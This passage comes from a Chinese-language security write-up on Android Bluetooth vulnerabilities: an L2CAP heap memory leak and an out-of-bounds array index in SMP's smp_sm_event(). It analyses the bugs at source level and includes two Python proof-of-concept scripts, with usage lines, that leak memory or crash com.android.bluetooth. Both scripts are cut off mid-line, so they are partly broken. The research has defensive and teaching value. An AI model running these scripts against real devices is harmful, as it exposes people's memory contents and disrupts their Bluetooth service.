例如：`$ sudo python l2cap02.py hci0 00：11：22：33：44：55`。
    import os
    import sys
    from l2cap_infra import *
    L2CAP_SIGNALLING_CID = 0x01
    L2CAP_CMD_DISC_REQ = 0x06
    def main(src_hci, dst_bdaddr):
        l2cap_loop, _ = create_l2cap_connection(src_hci, dst_bdaddr)
        # This will leak 4 bytes from the heap 这将从堆中泄漏4个字节
        print "Sending L2CAP_CMD_DISC_REQ command in L2CAP connection..."
        cmd_code = L2CAP_CMD_DISC_REQ
        cmd_id = 0x41               # not important
        cmd_len = 0x00              # bypasses this check at lines 296/297 of l2c_main.cc:   p_next_cmd = p + cmd_len; / if (p_next_cmd > p_pkt_end) {
        # here we use L2CAP_SIGNALLING_CID as cid, so l2c_rcv_acl_data() calls process_l2cap_cmd():
        #这里我们将L2CAP_signaling_CID用作CID，因此l2c_rcv_acl_data（）调用进程_L2CAP_cmd（）：
        # 170    /* Send the data through the channel state machine */
        # 171    if (rcv_cid == L2CAP_SIGNALLING_CID) {
        # 172      process_l2cap_cmd(p_lcb, p, l2cap_len);
        l2cap_loop.send(L2CAP_Hdr(cid=L2CAP_SIGNALLING_CID) / Raw(struct.pack(' ")
        else:
            if os.getuid():
                print "Error: This script must be run as root."
            else:
                main(*sys.argv[1:])
## 漏洞3：Bluetooth SMP smp_sm_event() OOB Array Indexing
`Bluetooth SMP smp_sm_event() OOB阵列索引`
###  简要
蓝牙范围内的远程攻击者可以使用Android
蓝牙堆栈中的漏洞，通过以意外传输方式将包含`SMP_OPCODE_PAIRING_REQ`命令的`SMP`数据包发送到目标设备，从而使`com.android.bluetooth`守护程序访问其边界之外的数组。
###  前置介绍
####  安全管理协议SMP
SMP（The Security Manager Protocol ）
连接建立之后，双方通过某些方式协商共同的密钥，然后将后续要传输的数据用这个密钥通过加密算法进行加密，然后发送。接收方，接收到这些数据后，必须使用正确的密钥来解密，才能得到正确的数据了。接着，建立密钥，即完成双方密钥协商，就密钥一事达成共同一致的过程。
过程如图所示：
> 为运行在低功耗蓝牙协议栈上的应用程序提供诸如身份验证，设备授权和数据隐私等服务的权限。
###  漏洞详情
> 数组索引只接受0x0和0x1，而作为索引的变量还能设置为0xff，导致后续引用可能导致分段错误
`SMP协议`通过预定义的`L2CAP_SMP_CID（0x06）`通道，位于`L2CAP`之上。
传入的`SMP数据包`由`smp_data_received()`函数`[ platform / system / bt / stack / smp /
smp_l2c.cc ]`处理。如果 通过包含`SMP_OPCODE_PAIRING_REQ（0x01）`命令的`L2CAP_SMP_CID`固定通道
接收到输入`SMP`数据包，则将到达以下代码：
    static void smp_data_received(uint16_t channel, const RawAddress& bd_addr,
                                  BT_HDR* p_buf) {
      [...]
      /* reject the pairing request if there is an on-going SMP pairing */
      if (SMP_OPCODE_PAIRING_REQ == cmd || SMP_OPCODE_SEC_REQ == cmd) {
        if ((p_cb->state == SMP_STATE_IDLE) &&
            (p_cb->br_state == SMP_BR_STATE_IDLE) &&
            !(p_cb->flags & SMP_PAIR_FLAGS_WE_STARTED_DD)) {
          p_cb->role = L2CA_GetBleConnRole(bd_addr);
      [...]
如上面的代码所示，最后一行中`p_cb-> role`设置为`L2CA_GetBleConnRole（bd_addr）`返回的值。`p_cb->
role`应该保存以下值之一[ `platform / system / bt / stack / include / hcidefs.h` ]，也就是
p_cb->role的值可以是0x00、0x01、0xff
    /* HCI role defenitions */
    #define HCI_ROLE_MASTER 0x00
    #define HCI_ROLE_SLAVE 0x01
    #define HCI_ROLE_UNKNOWN 0xff
如果我们查看`L2CA_GetBleConnRole()`函数的代码`[ platform / system / bt / stack / l2cap /
l2c_ble.cc ]`，我们可以看到它调用了`l2cu_find_lcb_by_bd_addr()`为了查找活跃的链接控制块（an active
Link Control
Block）`（LCB）`结构匹配远程`BDADDR`并且使用低能耗传输`（BT_TRANSPORT_LE）`；如果找不到它，则返回`HCI_ROLE_UNKNOWN（0xff）`。当我们通过`BR/EDR`（基本速率/增强数据速率，也称为“经典”蓝牙）传输发送包含`SMP_OPCODE_PAIRING_REQ`命令的`SMP`数据包时，这种情况会发生，因为它只适用于低能量（LE）传输：
    uint8_t L2CA_GetBleConnRole(const RawAddress& bd_addr) {
      uint8_t role = HCI_ROLE_UNKNOWN;
      tL2C_LCB* p_lcb;
      p_lcb = l2cu_find_lcb_by_bd_addr(bd_addr, BT_TRANSPORT_LE);
      if (p_lcb != NULL) role = p_lcb->link_role;
      return role;
    }
因此，回到`smp_data_received()`函数，将`p_cb->
role`设置为`HCI_ROLE_UNKNOWN（0xff）`之后，它调用`smp_sm_event()` [ `platform / system /
bt / stack / smp / smp_main.cc` ]，我们到达以下代码：
    953  void smp_sm_event(tSMP_CB* p_cb, tSMP_EVENT event,      tSMP_INT_DATA* p_data) {
                            ...
    957    tSMP_ENTRY_TBL entry_table = smp_entry_table[p_cb->role];
                            ...
    970    /* look up the state table for the current state */
    971    /* lookup entry /w event & curr_state */
    972    /* If entry is ignore, return.
    973     * Otherwise, get state table (according to curr_state or          all_state) */
    974    if ((event  role`作为索引从`smp_entry_table`静态数组中读取，而无需检查`p_cb->
role`是否具有两个有效值之一（`HCI_ROLE_MASTER（0x00）`或`HCI_ROLE_SLAVE（0x01）`）。这就是漏洞所在：`smp_entry_table`静态数组仅包含2个元素，而`p_cb->
role的`值为`0xFF`，是在通过`BR /
EDR`传输接收到包含`SMP_OPCODE_PAIRING_REQ`命令的`SMP`数据包之后，而不是通过预期的低能耗传输：
    static const tSMP_ENTRY_TBL smp_entry_table[] = {smp_master_entry_map,
                                                     smp_slave_entry_map};
因此，由于执行`entry_table = smp_entry_table
[0xff]`时的OOB索引，`entry_table`局部变量将包含一些垃圾值（无论是否在`bluetooth.default.so`二进制数据的`smp_entry_table`全局变量之后）。因此，稍后，在第975行，当取消引用`entry_table
[event- 1]
[curr_state]`时，很可能会导致分段错误（受特定版本的`bluetooth.default.so`二进制文件的影响，`smp_entry_table`全局变量位于该二进制文件中）），这将使`com.android.bluetooth`守护程序停止工作。
* * *
总结来说，过程如下图所示：
文中提及的函数调用关系：
【箭头指向表示调用该函数】
理论上讲，如果能够找到了一个版本的`bluetooth.default.so`，取消引用`entry_table [event-1]
[curr_state]`，那么程序就不会崩溃，可以进一步解决此错误。
###  Proof-of-Concept（概念验证）
以下Python代码触发了该漏洞，并且很有可能使目标设备上的`com.android.bluetooth`守护程序崩溃。
此Python代码使用Blueborne框架中的[l2cap_infra](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)包。
用法： `$ sudo python smp01.py  `。
例如：`$ sudo python smp01.py hci0 00：11：22：33：44：55`。
    import os
    import sys
    from l2cap_infra import *
    L2CAP_SMP_CID = 0x06
    # This matches the CID used in l2cap_infra to establish a successful connection.
    OUR_LOCAL_SCID = 0x40
    SMP_OPCODE_PAIRING_REQ = 0x01
    def main(src_hci, dst_bdaddr):
        l2cap_loop, _ = create_l2cap_connection(src_hci, dst_bdaddr)
        print "Sending SMP_OPCODE_PAIRING_REQ in L2CAP connection..."
        cmd_code = SMP_OPCODE_PAIRING_REQ
        the_id = 0x41       # not important
        cmd_len = 0x08
        flags = 0x4142      # not important
        # here we use L2CAP_SMP_CID as cid
        l2cap_loop.send(L2CAP_Hdr(cid=L2CAP_SMP_CID) / Raw(struct.pack(' ")
        else:
            if os.getuid():
                print "Error: This script must be run as root."
            else:
                main(*sys.argv[1:])
## 结论
漏洞2和漏洞1思想本质上是一致的。
  * 相同点：都因为`STREAM_TO_UINT16`宏没有对读入数据进行检验，是否到达数据包中还有足够的数据，导致越界读取，最后泄漏内存数据。
  * 不同点：在绕过前面判断后 到达的泄漏函数，漏洞1只向远程对等方法送了第二个从数据包那块读入的uint16_t数据；而漏洞2则向远程对等放发送了两个从数据包那块读入的uint16_t的数据，所以漏洞1可以泄漏2两个字节，漏洞2可以泄漏4个字节
前两个漏洞会影响处理L2CAP协议的代码，并且它们允许远程攻击者（在蓝牙范围内）泄漏属于`com.android.bluetooth`进程的内存内容。这些内存泄露漏洞可能对
**漏洞利用链的早期阶段** 的攻击者有所帮助，甚至可以用来 **检索敏感数据** 。
第三个漏洞是SMP协议实现中的 **越界数组索引错误** ，尽管最有可能使`com.android.bluetooth` **进程崩溃**
，但仍有可能利用它在易受攻击的Android设备上远程执行代码。有趣的是，与两个L2CAP问题不同，此SMP错误并不是解析格式错误的数据包的结果。实际上，可以通过发送格式
**正确的SMP数据包** （包含`SMP_OPCODE_PAIRING_REQ`）来触发它，但是要是通过 **BR / EDR（“经典”蓝牙）传输**
而不是预期的 **BLE（低能耗）传输** 来触发。
总的来说，虽然是两类漏洞，但是问题起因都在于代码上的检验不够完整导致的，使得程序执行到了非预期的情况。
## 参考